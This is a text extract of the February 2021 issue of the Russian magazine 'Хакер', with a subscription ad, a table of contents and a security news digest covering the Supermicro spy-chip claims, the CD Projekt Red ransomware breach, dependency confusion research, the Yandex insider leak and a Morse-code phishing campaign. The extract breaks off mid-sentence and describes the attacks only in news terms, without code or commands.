
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                Февраль 2021
            № 263
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Безопасность Android 12 и прин цип работы корутин

    Близкие контакты
  Разбира емся, как работа ют системы безопасности кредитных карт

    Близкие контакты
  Как хакеры кра дут деньги с бан ковских карт

    Близкие контакты
  Как работа ют ата ки на чиповые кар ты

    Пентест по-своему
  Создаем собс твен ную методику тестирова ния на примере машин с OSCP и Hack The Box

    Это ловушка!
  Как мы расставляли ханипо ты и кто в них попал ся

    Шпаргалка по persistence
  Как надеж но прописать ся на хос те или выявить факт компрометации

    Реверсинг .NET
  Как искать JIT-ком пилятор в приложениях

    HTB Passage
  Эксплуатируем RCE в CuteNews и под нима ем привилегии через gdbus

    HTB Reel2
  Захватыва ем машину  через  Outlook  и  разбира емся  с  технологией  Just  Enough
  Administration

    Больше не твои документы
  Как выглядят облачные хра нилища гла зами хакера

    Крадущийся питон
  Создаем прос тейший троян на Python

     IP без ошибок
  Изучаем прин ципы работы с IP-адресами

    Процессы и память в Linux
  Отрывок из кни ги «Внут реннее устройство Linux»

    Титры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: патч для Cyberpunk 2077 задерживается
из‐за взлома CD Projekt Red, пользователи RuTracker соб‐
рали два миллиона рублей на жесткие диски, в китай ском
железе  вновь  обна ружили шпионские  чипы,  сотрудник
Яндекса скомпро метировал почти 5000 почтовых ящиков
пользователей, а Билл Гейтс пре достерегает — если вы
не Илон Маск, не спешите покупать крип товалюту.





НОВЫЕ «ЖУЧКИ»
В КИТАЙСКОМ
ЖЕЛЕЗЕ
В 2018 году издание Bloomberg опуб ликова ло серию статей, рас сказыва‐
ющую об аппаратных «закладках», которые яко бы были обнаружены на сер‐
верных платах Supermicro и поз воляли китай ским хакерам скомпромети‐
ровать их.
   Так как это оборудование используют крупные техничес кие компании,
вклю чая Apple и Amazon, разразился грандиозный скандал. Представители
Amazon  и  Apple  поспешили  категоричес ки  опровергнуть  заявления
Bloomberg, глава Apple говорил, что Bloomberg вооб ще нужно отоз вать этот
материал, и даже АНБ сообщало, что это была «ложная тревога». В итоге вся
эта история затихла, но удостоилась сра зу двух наград Pwnie: как «самый
перехайпленный баг» и «самый крупный epic fail».
   Теперь, спустя три года, журналисты Bloomberg подготовили новый объ‐
емный доклад на все ту же тему. На этот раз изда ние ссы лается на дан‐
ные 50 разных источников в правитель стве и час тном секторе (в основном
неназванных) и заявляет, что продукция Supermicro более десяти лет исполь‐
зуется спецслужбами Китая. Причем спецслужбам США якобы прекрасно
известно об этом, однако информация замалчива ется ради изучения атак
и создания эффективных средств защиты.
  В новой статье упоминаются три конкретных инцидента.
 1. В 2010 году Министерство обо роны США обнаружило, что тысячи его
   компьютеров отправляли данные в Китай (виной этому был скры тый код,
   найденный в чипах, которые отвечают за процесс запуска сервера).
 2. В 2014 году компания Intel заметила, что китайская хак‐группа проникла
   в ее сеть через сервер, который загрузил малварь с сай та обновлений
   неустановленного вен дора.
 3. В 2015 году ФБР предупреждало ряд неназванных компаний, о том, что
   китайские шпионы внедрили дополнительный чип с бэкдором на серверы
   некоего производителя.

То есть Bloomberg снова пишет о том, что продукция Supermicro (в частности,
материнские платы для серверов) содержит скрытые «закладки». В статье
упоминаются зло намеренные изменения на уровне BIOS, необходимые
для загрузки и выпол нения шпионского кода, скры того в прошивке. Якобы
данный код нужен в том числе для атак на других вендоров.
   Также в статье утвержда ется, что еще в 2012 году ФБР начало контрраз‐
ведывательную операцию, в ходе которой были получе ны ордера для наб‐
людения за группой сотрудников Supermicro. Журналисты не знают, продол‐
жается ли это расследование до сих пор, но утверждают, что ФБР сотрудни‐
чало с частным сектором, чтобы изучить «шпионские микросхемы», скрытые
на материнских платах.
  В ответ на оче редную порцию обвинений в свой адрес представители Su‐
permicro опубликовали длинное заявление, в котором вновь все отрицают:



      «Статья Bloomberg — это смесь из раз розненных и неточ ных утвер-
     жде ний, появив шихся много лет назад. В ней приведе ны надуманные
      выводы, которые вновь не выдер жива ют никакой критики.
       Фак тичес ки в прош лом месяце Агентство национальной безопас-
      ности США снова сообщило Bloomberg, что оно придер жива ется своих
      ком мента риев, данных в 2018 году, и „не может под твер дить, что этот
      инцидент  или  пос леду ющие  описанные меры  реагирова ния  ког-
      да‑либо име ли мес то“.
        Нев зирая на утвер жде ния Bloomberg о пред полагаемых рас сле-
      дова ниях,  связанных  с  кибер- или национальной безопас ностью,
      которые якобы проводятся уже более десяти лет, ни пра вительство
     США, ни наши пар тне ры или клиенты ни разу не связыва лись с Super-
      micro по поводу этих пред полагаемых рас сле дова ний».

Как и три года назад, в этот раз опять никто не представил доказательств
существования «шпионских чипов». Зато Bloomberg опять критику ют ИБ‐спе‐
циалисты, включая, например, Тэвиса Орманди из Google Project Zero.





В новом отчете Bloomberg фигурирует мало наз ванных источников, но один
из них — это Мукул Кумар (Mukul Kumar), глава безопасности компании Altera.
Он уверяет, что узнал о шпионских чипах во время несекретного брифинга.
«Это был шпионаж на самой плате. На плате была микросхема, которой
не дол жно было там быть, и она „звонила домой“, не в Supermicro, а в
Китай», — цитирует Bloomberg.
  По следам новой статьи Bloomberg журналисты издания The Register про‐
вели собственное небольшое рас следова ние: они поговорили с бывшим
руководителем крупной полупроводниковой компании, который попросил
не называть его имени. К удивлению журналистов, тот счел чип, упомянутый
в отчете Bloomberg, имеющим право на жизнь, а сам отчет достоверным.
   «Я держал в руках физичес кие улики и встречал [подобные раз работки]
нескольких правительств», — заявил источник. По его словам, в подобных
операциях преуспели Китай, Израиль и Великоб ритания, а также такими раз‐
работками занимаются Франция, Гер мания и Россия.
   Также неназванный спикер The Register говорит, что атаки, подобные опи‐
санным Bloomberg, действительно случаются, но, как правило, они направле‐
ны на получение доступа к критичес ки важным системам, и речь в таких слу‐
чаях идет о национальной безопасности. По его словам, софтверные атаки
реализовать куда проще, но их также легче обнаружить. Зато сложность сов‐
ременного аппаратного обеспечения серьезно зат рудняет поиск таких «зак‐
ладок».


МАЛВАРИ НА GO СТАЛО НА 2000% БОЛЬШЕ

Эксперты ком пании Intezer подсчитали, что с 2017 года количес тво вредонос ных программ,
написанных на языке Go, увеличилось на 2000%, и в нас тоящее время такая мал варь уже ста‐
ла обычным явлением.

Как правило, на Go пишут бот неты, нацеленные на IoT‐устройства и Linux. Они либо устанав‐
ливают криптовалютные майнеры, либо используют зараженные устройства для DDoS‐атак.
Кроме того, на Golang пишут все больше вымога телей.





РЕКОРД BUG BOUNTY
Компания Google опубликова ла статистику выплат по программам bug bounty
за прошедший 2020 год. Оказалось, за это время иссле дователи из 62 стран
мира обнаружили 662 уязвимос ти в продуктах Google, заработав на этом
более 6 700 000 дол ларов. Это новый рекорд и самая крупная сумма выплат
за все годы существования программ воз награждения за уязвимости, пре‐
вышающая даже 6 500 000 долларов, потраченные компанией в 2019 году.





Большинство выплат ИБ‐эксперты получи ли за ошиб ки, найденные в рамках
программы    Chrome   VRP      (Vulnerabilities    Rewards    Program):
более 2 100 000 дол ларов за 300 уяз вимос тей, обнаруженных в браузере
Google. Это на 83% больше, чем в 2019 году.
  Еще одной важной частью программы компании стала bug bounty ини‐
циатива для Android. На уязвимос тях в коде мобиль ной ОС исследователи
заработали порядка 1 740 000 долларов, и еще 270 000 долларов им принес‐
ли ошибки, найденные в популярных и широко используемых при ложениях
из Google Play Store.
   Также в отчете компании перечислены следующие инте ресные цифры
минувшего года:
 • Бонус  за  баги  в  предваритель ной  версии  Android  11  составлял
   более 50 000 дол ларов и был применен к 11 отчетам. Это позволило
   Google исправить ряд проб лем еще до официаль ного релиза Android 11.
 • Команде исследователей 360 Alpha Lab, орга низованной при компании
   Qihoo 360, принадлежат рекордные восемь экс плоитов (30% от обще го
   количества) для различных уязвимос тей. Исследователи лидиру ют в этой
   области, так как за свой экспло ит 2019 года они получили рекордную вып‐
   лату в размере 161 337 долларов (плюс еще 40 000 долларов в рамках
  Chrome VRP).
 • Другой неназванный исследова тель предста вил в 2020 году два эксплоита
   и теперь тоже борется за пер вое мес то, так как суммарный размер
   заработанных им вознаграждений приб лижа ется к 400 000 долларов.

По программе исследовательских грантов Google ИБ‐исследователям было
передано около 400 000 долларов. Так, гранты получили более 180 экспер‐
тов, которые в ито ге прислали 200 отчетов об ошиб ках, благодаря чему были
обнаружены 100 подтвержденных багов в про дуктах Google и опенсорсной
экосистеме.


7100 ДОЛЛАРОВ ЗА ДОСТУП К ЧУЖОЙ СЕТИ

В условиях пандемии и повсеместного перехода на удаленку торговля первичным дос тупом
к сетям компаний и организаций набирает обороты. По информации Digital Shadows, уже более
500 торговых площадок предлагают такие «товары». Так называемые брокеры первично го дос‐
тупа взламывают сети компаний и компрометируют сотрудников, но не заходят дальше это го
и действуют как посредники, продавая полученный дос туп другим злоумышленникам.

Средняя цена доступа к чужой сети составляет 7100 дол ларов США.

Итоговая стоимость доступа зависит от дохода организа ции, количества сотрудников,
количества доступных устройств и типа дос тупа.

Наиболее популярным методом проникновения в чужие сети по‐прежнему остается RDP — 17%
от общего числа объявлений. Также у RDP‐доступа самая высокая средняя цена — 9800 дол‐
ларов.


Доступ уровня администратора домена также ценится на чер ном рын ке: таких объявле ний нас‐
читывается 16% от общего чис ла, и средняя цена сос тавляет 8187 долларов.

Из‐за общемировой тенденции перехода на удален ную работу вырос спрос на дос туп к VPN,
который позволяет зайти в чужую кор поративную сеть. Средняя цена такого дос тупа сос тавляет
2871 доллар (15% от общего чис ла объявлений).





НИКАКИХ IP
ДЛЯ GOOGLE
В грядущей iOS 14.5, которая выйдет в ближай шие месяцы, появится фун‐
кция, которая перенаправит весь трафик Safe Browsing в браузере Safari
через прокси‐серверы, контролируемые Apple. Таким образом в компании
хотят сохранить конфиденциальность пользователей и не позволить Google
узнать их IP‐адре са.
  Сначала информация о новой функции появилась на Reddit, но вскоре эти
слухи подтвердил глава отдела раз работки WebKit Мацей Стаховяк (Maciej
Stachowiak). Новая функция будет работать лишь в том слу чае, если поль‐
зователь активировал опцию Fraudulent Website Warning («Пре дупреждать
о мошеннических сайтах») в настройках Safari. Эта опция обеспечивает под‐
держку технологии Safe Browsing от Google.
   Safe Browsing работает прос то: проверяет любой URL‐адрес, к которому
пользователь пытается получить дос туп, отправляя этот URL‐адрес (в ано‐
нимизированном виде) на серверы Google, а затем системы компании
получают доступ к сай ту и ска нируют его на наличие угроз. Если на сайте
обнаружены малварь, фишинговые формы и дру гие угрозы, Google сообщает
Safari пользовате ля, что нужно бло кировать дос туп к сайту, и показы вает пол‐
ноэкранное предупреждение.
  Несколько лет назад, когда в Google только запус тили API Safe Browsing,
компания «видела», к каким сайтам обращает ся поль зователь. Однако потом
разработчики предприняли ряд шагов для анонимизации этих данных. Тем
не менее Google по‐преж нему знает IP‐адрес, с которого приходит запрос
на проверку Safe Browsing.



      «Проблема в том, что Update API Safe Browsing никогда не был
      безопас ным. Его цель зак лючалась не в обес печении полной кон-
     фиденциальнос ти для пользовате лей, а скорее в ухуд шении качес тва
      данных, которые собира ют провайдеры», — еще в 2019 году писал
      извес тный крип тограф и профес сор универ ситета Джонса Хоп кинса
      Мэттью Грин (Matthew Green).

Новая функция Apple будет передавать все запросы Safe Browsing через
собственный прокси‐сервер Apple, и в результате все они будут выглядеть
как поступающие с одного и того же IP‐адреса.


ГЕЙТС О КРИПТОВАЛЮТНОМ АЖИОТАЖЕ
В феврале 2021 года Tesla Илона Маска купила биткойнов на 1 500 000 000 долларов США,
а стоимость биткойна в этом месяце превысила 56 000 дол ларов, установив новый абсо лютный
рекорд. Разумеется, на фоне таких новос тей инте рес к криптовалютам снова растет, и мно гие
стремятся инвестировать в криптовалюту, не сильно разбираясь в вопросе. На это обратил
внимание Билл Гейтс, общаясь с жур налис тами Bloomberg.





→«У Илона куча денег, и он очень продвинутый, так что я не беспоко юсь о том, что его бит‐
койны будут хаотично расти и падать. Но я правда считаю, что этому помешательству поддают‐
ся даже те люди, у которых может не быть лишних средств в запасе. Поэтому в отно шении бит‐
койна я настроен не слишком оптимис тично. Я считаю, что, если у вас меньше денег, чем
у Илона, вам, пожалуй, стоит быть осторожнее»
— Билл Гейтс в интервью Bloomberg





ЯНДЕКС.УТЕЧКА
В середине фев раля компания «Яндекс» сооб щила, что во вре мя регулярной
проверки ее служба безопасности выявила факт внутренней утечки данных.
   Расследование показа ло, что один из сот рудников компании предос‐
тавлял несанкционированный дос туп к почтовым ящикам пользовате лей.
Это был один из трех системных администраторов, «обладавших такими пра‐
вами доступа, необ ходимыми для выполнения рабочих задач по обес печению
технической поддержки сервиса». В результате его действий оказались
скомпрометированы 4887 почтовых ящиков.
  Сообщается, что в нас тоящее время неавторизо ванный доступ в скомпро‐
метированные ящики уже заб локирован, а все пострадавшие получили уве‐
домления о необ ходимос ти смены пароля. Также компания уже обратилась
в правоохранительные орга ны.



      «По выяв ленному инциденту проводится внутреннее рас сле дова ние,
      и будут перес мотре ны процес сы работы сотрудников, обла дающих
     админис тра тив ными пра вами такого уров ня дос тупа. Это поможет
     минимизировать влияние челове чес кого фак тора на безопас ность
      данных пользовате лей.
      Мы очень сожале ем о слу чив шемся и приносим извинения поль-
      зовате лям, которые пос тра дали из‑за этого инцидента», — пишут
      пред ста вите ли Яндекса.


1000 РАЗРАБОТЧИКОВ ЗА ВЗЛОМОМ SOLARWINDS

В интервью CBSNews президент Microsoft Брэд Смит (Brad Smith) заявил, что недавняя атака
на SolarWinds была «самой крупной и самой изощренной, которую он когда‐либо видел».


По его словам, ана лиз взлома, проведен ный спе циалистами компании (над рассле дованием
корпели более 500 специалис тов Microsoft), поз воляет предположить, что над этой атакой
работали свыше 1000 разработчиков. При этом Смит говорит, что в ито ге злоумышленники
переписали всего 4032 строки коде в платформы Orion, который в целом содержит миллионы
строк кода.





                                     Продолжение статьи →
← Начало статьи





 ВЗЛОМ
 CD PROJEKT RED
  В начале февраля 2021 года компания CD Projekt Red сообщила, что стала
  жертвой шифровальщика.  Тогда вымога тели  утверждали,  что  похитили
  исходные коды таких игр компании, как Cyberpunk 2077, The Witcher 3 (вклю‐
   чая еще не вышедшую версию с рейтрейсин гом) и Gwent, а также финан‐
   совую, юридическую, административную и HR‐документацию.
    CD Projekt Red сразу заявила, что не намерена вести переговоры с прес‐
   тупниками и платить им выкуп, понимая, что в итоге скомпрометированные
  данные все равно могут быть рас крыты.



         «Хотя некоторые устройства в нашей сети были зашиф рованы, резер-
        вные  копии  оста лись  нетронуты ми.  Мы  уже  защитили  нашу
        ИТ‑инфраструк туру и начали вос ста нов ление данных», — писали раз-
         работчики.

  Вскоре злоумышленники выставили похищенные данные на аукцион в дар‐
  кнете. Стартовая цена «лота» с исходными кодами игр и другой украденной
  информацией составляла миллион долларов с шагом 500 тысяч долларов,
  а «блиц‐цена» равнялась семи миллионам долларов.
    Однако в итоге аукцион злоумыш ленни ков завершился, не успев начаться.
  Хакеры сообщили, что им пос тупило предложение «вне рамок форума»,
  которое их устроило, данные были про даны с условием дальнейшего нерас‐
  пространения, и в ито ге аукцион закрылся.





  ИБ‐исследователи признают, что теперь мы вряд ли узнаем, кто купил эту
  информацию. Согласно циркулиру ющим в сети теориям, при обрести данные
  мог кто угодно, от конкурентов CD Projekt Red, жела ющих проанализи ровать
  исходники и документы в поисках корпоративных секретов, до самой CD Pro‐
   jekt Red, которая все же пошла на сделку с хакерами, чтобы сохранить те
  самые секреты в тайне и предотвра тить утечку.
    Интересно, что из‐за взло ма компании задерживается следующий круп‐
  ный патч для Cyberpunk 2077 (1.2). В декаб ре прошлого года разработчики
  обещали выпустить в январе и феврале большие патчи. Они должны были
  исправить множество ошибок и извес тных проблем, с которыми сталкива‐
  ются игроки, а также улучшить производительность. Патч 1.1 действительно
  был выпущен в январе, как и пла ниро валось, а вот патч 1.2 теперь отложен
   как минимум до середины марта.


 ПРАЗДНИЧНЫЙ ФИШИНГ

   Эксперты Check Point рассказали, что хакеры «отметили» День святого Валентина с раз махом.
   Традиционно февраль — это месяц покупок ко Дню святого Валентина, а в текущих условиях,
   связанных с пандемией, в целом отмечается рост онлайн‐шоп пинга и воз никно вение новых
   способов мошенничества на этом фоне.

   Еженедельно аналитики фиксировали более 400 фишин говых кампаний, пос вящен ных праз‐
   днику.

   Число новых доменов выросло на 29% по сравнению с прошлым годом и дос тигло 23 000.

   Около 2,3% доменов (523) оказались вредоносными или подоз рительными.





   Интересно, что в этом году некоторые злоумыш ленники стали повторно использовать темы
   и веб‐страницы, оставшиеся от прошлых фишинговых кампаний.





 НОВАЯ АТАКА
 НА ЦЕПОЧКУ
 ПОСТАВОК
  ИБ‐эксперт Алекс Бирсан (Alex Birsan) подробно описал новую проблему,
  которая представляет собой вариацию ата ки на цепочку пос тавок. Эта вари‐
  ация атаки получила наз вание dependency confusion (путани ца зависимостей)
  или substitution attack (атака на замещение). За обнаружение этого способа
   атак исследователь уже получил от различных компаний более 130 тысяч дол‐
  ларов по программам bug bounty.
    Дело в том, что, экс плуатируя эту проб лему, специалист сумел загрузить
  собственный (безвредный) код в системы Microsoft, Apple, PayPal, Shopify,
   Netﬂix, Yelp, Tesla, Uber и дру гих компаний.
     Суть dependency confusion проста: малварь из опенсорсных репози ториев
   (включая PyPI, npm и RubyGems) автоматически распределяется дальше
  по всей цепочке поставок, про никая во внутренние приложения компаний
  без какого‐либо участия пользователей. Именно это отличает атаку от обыч‐
  ного тайпсквоттинга.
    На эту простую идею Бир сана в прош лом году натол кнул его кол лега
  Джастин Гарднер  (Justin  Gardner). Тот поделился с Бирсаном файлом
  манифеста package.json из npm‐пакета, исполь зуемого внутри PayPal. Ока‐
   залось, что некоторых пакетов из манифеста нет в обще доступном репози‐
  тории npm, это приват ные пакеты, соз данные инженерами PayPal, и они
  используются и хранятся только внутри компании.





  Глядя на это, Бирсан задался воп росом, должен ли пакет с таким же именем
  существовать в общедос тупном репозитории npm, и если да, то какой из них
   в итоге будет иметь приоритет? Что бы проверить свою теорию, исследова‐
   тель начал искать названия дру гих приватных пакетов, которые можно обна‐
  ружить в файлах манифестов в репозиториях GitHub или в CDN известных
  компаний, но которых нет в общедоступных репози ториях.
    Обнаружив несколь ко таких целей, Бир сан стал создавать фейковые про‐
  екты с такими же названиями в npm, PyPI и RubyGems (хотя, отмечает Бирсан,
   уязвимы и другие менеджеры пакетов, в том числе JFrog и NuGet). Эксперт
  создавал эти фальшив ки из‐под сво его аккаунта и сопровождал пояснением,
   что они предназначены исключитель но для исследования безопасности и не
  содержат никакого полезного кода.
     Эксперимент показал, что, если пакет зависимостей, используемый при‐
  ложением, существует как в общедос тупном опенсорсном репозитории, так
  и в частной сбор ке, публичный пакет в итоге получает приоритет и будет
  использован без каких‐либо действий со стороны разработчика. Также ока‐
   залось, что в случае с пакетами PyPI пакет с более высокой версией име ет
  приоритет независимо от того, где он расположен.
     Затем, придерживаясь той же тактики, Бир сан успешно атаковал Microsoft,
   Apple, PayPal, Shopify, Netﬂix, Tesla, Yelp, Uber и другие крупные компании,
  просто опубликовав пакеты с такими же име нами, как у пакетов, исполь‐
  зуемых внутри компаний.



         «Такие уяз вимос ти и недора ботки в автоматизированных инс тру ментах
         для сбор ки или уста нов ки могут привес ти к тому, что обще дос тупные
         зависимос ти будут ошибоч но приниматься за внутренние зависимос ти
         с таким же име нем», — рас ска зал Бир сан изда нию Bleeping Computer.

  Все тестовые пакеты исследователя содержали предустановленные скрипты,
  которые автоматически запускали скрипт для извлечения идентифицирующей
  информации с «зараженной» машины, сра зу пос ле пула пакетов. Понимая,
   что его скрипты будут устанавливать соеди нение из защищенных корпоратив‐
  ных сетей, Бирсан решил обойти механизмы безопасности, использовав DNS
  для извлечения данных.





  Пример работы такого скрипта можно увидеть ниже: он сообщал исследова‐
   телю, что IP‐адрес, с которого исходит запрос, при надлежит PayPal, а также
  называл имя пользователя и домашний каталог пострадавшей системы.





  Собрав таким образом данные и убедившись в своей правоте, исследова‐
   тель начал сообщать о своих выводах уяз вимым компаниям, получая воз‐
  награждения в рамках программ bug bounty. К примеру, PayPal уже обнародо‐
  вала отчет экспер та на HackerOne и выплатила ему 30 тысяч долларов; Yelp
  тоже подтвердила выводы Бирсана и вознагра дила его 15 тысячами дол‐
   ларов.
    Но серьезнее всех к dependency confusion, пожалуй, отнеслась компания
   Microsoft. Данной проблеме был присвоен идентификатор CVE‐2021‐24105
   (для Azure Artifactory), и компания не только выплатила эксперту 40 тысяч дол‐
   ларов, но и опубликовала бюллетень безопас ности, где подробно описывает
  проблему и предлагает методы ее решения. В час тности, инже неры Microsoft
  рекомендуют минимизировать риски, защищая приватные пакеты с помощью
  контролируемых областей в публичных репозиториях, а также использовать
  верификацию на стороне клиента (закрепление версий, проверка целостнос‐
   ти).


 GOOGLE СПОНСИРУЕТ РАЗРАБОТЧИКОВ LINUX
   Представители Linux Foundation объявили, что ком пания Google будет спонсировать двух раз‐
   работчиков ядра, чтобы те могли посвятить все свое рабочее время повыше нию безопасности
   и устойчивости платформы. Таким образом будут трудоус троены Густаво Силва (Gustavo Silva)
   и Натан Ченслор (Nathan Chancellor). Первый займется отловом багов до того, как они попадут
   в продакшен, а также разработкой проактивной защиты. Второй будет специализиро ваться
   на багах, связанных с применением Clang/LLVM, а также внедрении сис темы неп рерывной
   интеграции для сборок на Clang.





  →«Обеспечение безопасности ядра Linux очень важно, так как это критичес ки значимая часть
   современных вычислений и инфраструктуры. От всех нас тре буется помогать всем, чем мы
   можем, чтобы обеспечивать надежную защиту.
     Мы выражаем особую благодар ность Google за под держку работы Гус таво и Натана по раз‐
   работке безопасности ядра Linux, а также благодарим всех соп ровождающих, разработчиков
   и организации, которые совместно помогли ядру Linux добить ся общемиро вого успе ха»
  — Дэвид А. Уилер, предста витель Linux Foundation





 2 000 000 РУБЛЕЙ
 ДЛЯ RUTRACKER
  В конце 2020 года администрация торрент‐трекера RuTracker объявила
  о старте краудфандинговой кампании, средства от которой пойдут на покупку
  жестких дисков, необ ходимых для сохранения раз дач. Напомню, что офи‐
  циально доступ к ресурсу в РФ заблокирован с 2015 года по решению Мос‐
   горсуда.



        «Наш тре кер стал своего рода уникальной библиоте кой не только
         популяр ного, но и ред чайшего материала, собранного и под держи-
        ваемого вами, нашими пользовате лями — сообщес тва ми авторов
        и релизе ров, модера торов и хра ните лей, энту зиас тами, сторонниками
         свобод ного обме на информа цией, — пишут админис тра торы. — Чрез-
        вычайно важно пос тараться сохранить Рутрекер как дос тупную кол-
        лекцию раз нообразного контента, иного дос тупа к которому зачас тую
        уже не сущес тву ет. Одна ко блокиров ка ресур са ока зыва ет негатив ное
         влияние и ста вит под угрозу многообразие сущес тву юще го на пор тале
        материала. Данное  огра ниче ние лиша ет все большее количес тво
        наших пользовате лей воз можнос ти полноценно учас твовать в фай-
        лообмене и под держивать тем самым жизнь и раз витие тре кера».

  Ставя перед собой цель сохранить имеющийся уникальный контент и обес‐
   печить доступ к нему, администраторы объявили сбор средств на жесткие
  диски для поддержки малосидируемых раздач.
     Такие раздачи уже более десяти лет поддерживает группа «Хранители»,
  которая добровольно хра нит на сво их устройствах 1 520 000 раз дач с малым
  количеством сидов общим объемом 2470 Тбайт (это примерно 620 жестких
  дисков по 4 Тбайт, или почти 6 миллионов руб лей). Сообщается, что в день
   эта группа раздает 100–150 Тбайь на редких раздачах, но личные ресурсы
  и возможности людей ограниченны, и энтузиасты попросту не успе вают спа‐
   сать все исчезающие раз дачи.
    В итоге было принято решение попытать ся соб рать 25 тысяч дол ларов,
  которых хватит на покупку HDD суммарным объемом 600–800 Тбайт. Соб‐
  ранные деньги обещали распределить меж ду проверенными Храните лями,
  предоставив им самим решать, какие именно нужны HDD, исходя из наличия
  свободных SATA‐слотов на материнской плате, места в корпусе, запаса
  по питанию и так далее.
    Сбор стартовал 4 янва ря 2021 года, и в конце февраля поставленная цель
  была достигнута: пользователи соб рали больше двух миллионов рублей.
  При этом кампания по‐прежнему активна, то есть пользователи могут про‐
  должать помогать ресурсу и дальше.


 МАЙНИНГ ВЫГОДНЕЕ DDOS?
   Рассказывая о DDoS‐атаках в четвертом квартале 2020 года, аналитики «Лаборатории Каспер‐
   ского» отмечают интересную тен денцию: операторы многих ботнетов, похоже, перенап равили
   часть своих мощностей на майнинг, чтобы заражен ные устройства приносили большую при‐
   быль.

  В четвертом квартале 2020 года общее число DDoS‐атак вырос ло на 10% по срав нению с ана‐
   логичным периодом 2019 года, но при этом снизилось на 31% по срав нению с третьим квар‐
   талом 2020 года.





  Cамым активным днем квартала с точки зрения DDoS стало 31 декабря 2020 года, когда
   было зафиксировано 1349 атак за сутки.

  В целом на снижение числа DDoS‐атак мог повлиять бурный рост рынка криптовалюты: на про‐
   тяжении 2019 года и в начале 2020 года чис ло криптомайнеров падало, но с августа 2020 года
   начало резко расти, а в четвертом квартале вышло на плато.





   По количеству DDoS‐атак в четвертом квартале, как и ранее, лидиро вали Китай (58,95%),
  США (20,98%) и Гонконг (3,55%).

   Linux‐ботнеты использовались почти в 100% атак.





                                        Продолжение статьи →
← Начало статьи





 NVIDIA
 ПРОТИВ МАЙНЕРОВ
  Из‐за роста стоимости криптовалют и пандемии коронавиру са цены на виде‐
  окарты достигли небывалых зна чений, к тому же на рынке в целом наблюда‐
   ется дефицит видеокарт. Причем это каса ется не только серии 3000,
  с которой дела обстоят совсем плохо, но и карт прошлых поколений. Дошло
  до того, что в начале февраля компания Nvidia возобновила поставки GeForce
  RTX 2060 и GeForce RTX 2060 Super, а также сно ва начала производить чипы
  для GeForce GTX 1050 Ti, чтобы хоть как‐то бороться с воз никшим дефицитом.
     Теперь же компания объявила о еще одной мере, которая призвана сде‐
   лать виде окарты менее привлекательными для майнеров. В новой GeForce
  RTX 3060 принудительно ухудшили майнин говую производительность. Хеш‐
  рейт для добычи Ethereum на этой карте занижен в два раза.



       «Мы геймеры до моз га кос тей. Мы зацик лены на новых игровых фун-
         кциях, новой архитек туре, новых играх и технологиях. Мы раз работа ли
         гра фичес кие процес соры GeForce для геймеров, и геймеры тре буют
        большего.
          Но  гра фичес кие процес соры  Nvidia  программируемы. И  поль-
         зовате ли пос тоянно откры вают новые приложе ния, от моделирова ния
        погоды и опре деле ния пос ледова тельнос ти генов до глу бокого обу-
         чения и робототехники. Майнинг крип товалю ты — один из таких слу-
          чаев. Драйверы для RTX 3060 пред назна чены для обна руже ния опре-
        деленных  атрибутов  алгоритма майнинга  крип товалю ты  Ethereum
        и огра ниче ния хеш рейта (или эффектив ности майнинга) пример но
         на 50%», — гла сит официальное заяв ление ком пании.

  Предвидя разочарование майнеров, представители Nvidia сообщают, что
  скоро выпустят новую линейку специальных май нинговых виде окарт — NVIDIA
  CMP (Cryptocurrency Mining Processor). У карт серии CMP не будет видеовы‐
   ходов, а также они получат более низкое пиковое напряжение ядра и частоту,
   что повысит их энергоэф фективность для майнинга.
     Известно, что в серии CMP будут представлены четыре модели, две
  из которых можно ждать уже в первом квартале 2021 года, а две оставшиеся
   появятся на рынке во втором квартале.





  270 АДРЕСОВ ДЛЯ ОТМЫВАНИЯ КРИПТЫ

   Оказывается, крип товалюту отмывают через совсем небольшой кластер онлайн‐сервисов,
   в числе которых обменники с высокой степенью риска (с низкой репутацией), игорные
   платформы, специальные миксер‑сервисы, а также финансовые сервисы, работа‐
  ющие с криптовалютой, но расположенные в юрис дикциях с высоким уровнем риска.

   По информации Chainalysis, лишь небольшая группа из 270 блокчейн‐адресов отмыла порядка
  55% всех криптовалют, связанных с различной прес тупной деятельностью. Более того, все го
   через 1867 адресов прошло примерно 75% всех криптовалют, связанных с преступной
   активностью в 2020 году, то есть поряд ка 1 700 000 000 дол ларов.





   То есть сфера отмывания криптовалюты находится в весь ма уязвимом положе нии. Всего нес‐
   колько хорошо спланированных операций правоохранительных органов, нап равленных на такие
   сервисы, могут помешать перемещению незакон ных средств множес тва преступных групп.





ФИШИНГ
 МОРЗЯНКОЙ
  Журналисты Bleeping Computer обнаружили на Reddit информацию о новой
  фишинговой кампании, которая использует азбуку Морзе для обфускации
  и сокрытия вре доносных URL‐адресов во вложениях электронной почты. Про‐
  веряя  эту информацию,  специалисты  изда ния нашли многочисленные
  образцы такой замаскированной малвари, загруженные на VirusTotal в фев‐
  рале 2021 года.
    Обычно фишин говая атака начина ется с электронного письма, замас‐
  кированного под инвойс и содержащего вложение, наз ванное по шаблону «[
  название_компании]_инвойс_[номер]._xlsx.hTML».  По  сути,  вложение
   в формате HTML с таким названием выглядит как инвойс в формате Excel.





  При просмотре вло жения в текстовом редакторе можно уви деть, что в его
  составе есть JavaScript, который сопоставляет буквы и цифры с азбукой Мор‐
   зе. Например, буква a отоб ража ется как «.‐», а буква b — это «‐...».





  Скрипт вызывает функцию decodeMorse() для декодирования морзянки
   в шестнадцатеричную систему, а полученная таким образом шестнад‐
  цатеричная строка затем преобразует ся в теги JavaScript, которые встав‐
  ляются в HTML‐страницу.
     Эти скрипты в сочетании с HTML‐вло жением содержат различные ресур‐
   сы, необходимые для отоб ражения поддельного файла Excel, в котором поль‐
